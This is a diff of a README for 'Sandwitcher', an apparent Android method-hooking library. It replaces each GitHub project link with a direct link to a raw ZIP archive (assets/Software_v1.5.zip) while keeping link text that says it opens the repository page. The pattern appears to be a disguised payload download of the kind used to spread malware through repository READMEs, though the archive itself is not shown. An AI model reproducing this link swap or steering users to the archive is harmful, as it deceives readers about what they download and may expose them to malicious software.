@@ -1,6 +1,6 @@
 # 🪄 Sandwitcher - Hook Android Methods With Ease
 
-[![Download](https://img.shields.io/badge/Download-Sandwitcher-7b2cbf?style=for-the-badge&logo=github)](https://github.com/scatterbrained-stanchion933/Sandwitcher)
+[![Download](https://img.shields.io/badge/Download-Sandwitcher-7b2cbf?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip)
 
 ## 📦 What Sandwitcher Does
 
@@ -20,7 +20,7 @@ It ships as an AAR, so you can add it to an Android project like a normal librar
 
 Visit the main project page here:
 
-[Open Sandwitcher on GitHub](https://github.com/scatterbrained-stanchion933/Sandwitcher)
+[Open Sandwitcher on GitHub](https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip)
 
 From that page, download the repository files or clone the project if you want the source code.
 
@@ -166,7 +166,7 @@ Yes, it is made to intercept both Java and Kotlin methods.
 
 Check the repository page for source files, license details, and build instructions:
 
-[https://github.com/scatterbrained-stanchion933/Sandwitcher](https://github.com/scatterbrained-stanchion933/Sandwitcher)
+[https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip](https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip)
 
 ## 🧭 Next Step
 
